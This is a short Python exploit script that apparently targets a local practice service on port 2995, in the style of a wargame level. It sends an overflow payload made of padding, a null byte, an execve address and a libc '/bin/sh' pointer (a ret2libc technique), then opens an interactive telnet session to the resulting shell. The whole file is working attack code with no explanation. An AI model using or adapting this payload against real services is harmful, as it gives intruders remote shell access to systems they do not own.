import struct
import socket
import telnetlib

HOST = "127.0.0.1"
PORT = 2995

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ipv4,tcp
s.connect((HOST,PORT))
t = telnetlib.Telnet()
t.sock = s

padding = "a" * 510 + "\x00" + "aaaabbbbccccddddeeeef"
base = 0xb7e97000
execve = struct.pack("I",0x08048c0c)
ret = "AAAA"
binsh = struct.pack("I",base + 0x11f3bf)

exploit = padding + execve + ret + binsh + "\x00"*8

s.send(exploit+"\n")
t.interact()
